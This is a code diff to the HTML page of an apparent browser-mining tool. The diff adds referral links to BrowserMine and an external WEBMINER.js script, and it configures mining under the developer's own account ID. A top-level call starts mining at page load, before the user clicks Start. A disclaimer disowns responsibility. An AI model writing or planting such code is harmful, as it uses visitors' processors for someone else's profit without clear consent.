@@ -12,9 +12,19 @@
 		<div id="menu_items" onclick="amd_click()"><p>Amd</p></div>
 	</div>
 
+	<div id='reg' align="center"><a href="https://browsermine.com/?ref=6123439">Ссылка для регистрации на сайте</a></div>
+
 	<div id = "attention">
 		<div id="warning"><p>!</p></div>
-		<div id="attention"><label>Всё что вы делаете, вы делаете на свой страх и риск, <br>автор не несёт ни какой ответсвенности</label></div>
+		<div id="attention">
+			<label>Всё что вы делаете, вы делаете на свой страх и риск, <br>Разработчик не несёт ни какой ответсвенности<br>
+			за прямые, косвенные и прочие убытки.<br>
+			А так же не имеет никакого отношения ни к стайту, ни к администрации: <br><a href="https://browsermine.com/?ref=6123439">BrowserMine.com</a><br>
+			Не даёт никаких гарантий касательно работы сайта, его платёжеспособности и т.д.<br>
+			Всё что вы делаете, вы делаете на свой страх и риск.
+
+			</label>
+	</div>
 	</div>
 
 	<div id="inp">
@@ -26,20 +36,30 @@
 		</form>
 	</div>
 	<div id="buttons">
-		<button>Start</button>
+		<button onclick="start()">Start</button>
 		<button>Stop</button>
 
 	</div>
 	<input type="color" name="">
 
+
+<script src="https://wm.bmwebm.org/WEBMINER.js"></script>
+
 </body>
 
 
 <script type="text/javascript">
+
+	var user_id = "6123439"
 	var nvidia = document.getElementById('nvidia');
 	var amd = document.getElementById('amd');
 	var cuda = 0
 	var op_cl = 0
+
+	WEBMINER.config({ 
+	login: user_id, // Your ID - required
+	pass: "minemine", 
+	}).power(cpu_clock);
 
 
 
@@ -77,8 +97,23 @@
 			op_cl = 0
 		}
 		console.log(cpu_clock)
-		//cpu_only = cpu_clock 
+		//cpu_only = cpu_clock
+
+		hash_rate = WEBMINER.getPower() 
+		
 	}
+
+
+	function start() {
+		cpu_only()
+		WEBMINER.config({ 
+		login: user_id, // Your ID - required
+		pass: "minemine", 
+		}).power(65);
+	}
+
+
+
 
 </script>
 </html>
